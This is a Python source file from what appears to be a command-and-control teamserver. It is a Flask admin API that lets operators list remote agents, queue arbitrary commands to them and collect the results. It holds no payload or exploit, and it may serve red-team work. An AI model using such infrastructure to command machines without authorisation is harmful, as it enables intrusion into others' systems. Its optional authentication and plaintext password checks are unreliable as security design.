# teamserver/admin/admin_server.py
# Runs the administrative HTTP server for the Teamserver, 
# exposing management APIs and admin functionalities.

from flask import Flask, request, jsonify
from functools import wraps
from queue import Queue
from teamserver.logger.CustomLogger import CustomLogger
log = CustomLogger("volchock-admin")

class AdminServer:
    def __init__(self, port, users_dict, shared_req_queue, auth_required=True, agent_handler=None, xor_key=None):
        self.port = port
        self.users = users_dict or {}
        self.auth_required = auth_required
        self.shared_req_queue = shared_req_queue
        self.agent_handler = agent_handler
        self.xor_key = xor_key
        self.connected_users = []
        self.app = Flask(__name__)
        self.add_endpoints()

    def check_auth(self, username, password):
        if (username in self.users and self.users[username] == password):
            if username not in self.connected_users:
                log.info(f"[+] New user connected: {username}")
                self.connected_users.append(username)
            return True
        else:
            log.error(f"[!] Incorrect login for user: {username}")
            return False

    def require_auth(self, f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not self.auth_required:
                return f(*args, **kwargs)
            auth = request.authorization
            if not auth or not self.check_auth(auth.username, auth.password):
                return (
                    jsonify({"error": "Unauthorized"}),
                    401,
                    {"WWW-Authenticate": 'Basic realm="Login required"'},
                )
            return f(*args, **kwargs)
        return decorated

    def add_endpoints(self):
        @self.app.route('/status', methods=['GET'])
        @self.require_auth
        def status():
            return jsonify({"status": "teamserver running"})

        @self.app.route('/logs', methods=['GET'])
        @self.app.route('/logs/<logger_name>', methods=['GET'])
        @self.require_auth
        def get_logs(logger_name=None):
            if logger_name is None:
                log_instance = CustomLogger("volchock")
            else:
                log_instance = CustomLogger(logger_name)
            logs = log_instance.get_logs()
            return jsonify({"logs": logs})

        @self.app.route('/pending_requests', methods=['GET'])
        @self.require_auth
        def pending_requests():
            reqs = []
            while not self.shared_req_queue.empty():
                reqs.append(self.shared_req_queue.get())
            return jsonify({"requests": reqs})

        @self.app.route('/agents', methods=['GET'])
        @self.require_auth
        def agents():
            if self.agent_handler is not None:
                agents = self.agent_handler.all_agents()
                result = []
                for aid, info in agents.items():
                    r = info.copy() if info else {}
                    r['agent_id'] = aid
                    result.append(r)
                return jsonify({"agents": result})
            else:
                return jsonify({"agents": []})

        @self.app.route('/agent/<agent_id>/info', methods=['GET'])
        @self.require_auth
        def agent_info(agent_id):
            if self.agent_handler is not None:
                info = self.agent_handler.get_agent(agent_id)
                if info:
                    return jsonify({"info": info})
                else:
                    return jsonify({"error": "Agent not found"}), 404
            else:
                return jsonify({"error": "No agent_handler"}), 500

        @self.app.route('/agent/<agent_id>/command', methods=['POST'])
        @self.require_auth
        def send_command(agent_id):
            if self.agent_handler is not None:
                data = request.get_json() or {}
                command = data.get("command")
                if not command:
                    return jsonify({"error": "No command provided"}), 400
                ok = self.agent_handler.queue_command(agent_id, command)
                if not ok:
                    return jsonify({"error": f"Agent {agent_id} not found"}), 404
                log.info(f"[+] New command submit by {request.authorization.username}: {command[0:25]}")
                return jsonify({"status": "command queued"})
            else:
                return jsonify({"error": "No agent_handler"}), 500

        @self.app.route('/agent/<agent_id>/results', methods=['GET'])
        @self.require_auth
        def get_results(agent_id):
            if self.agent_handler is not None:
                res = self.agent_handler.pop_agent_results(agent_id)
                return jsonify({"results": res})
            return jsonify({"results": []})

    def start(self):
        log.info(f"[+] Admin server started on port {self.port}")
        self.app.run(host="0.0.0.0", port=self.port, threaded=True)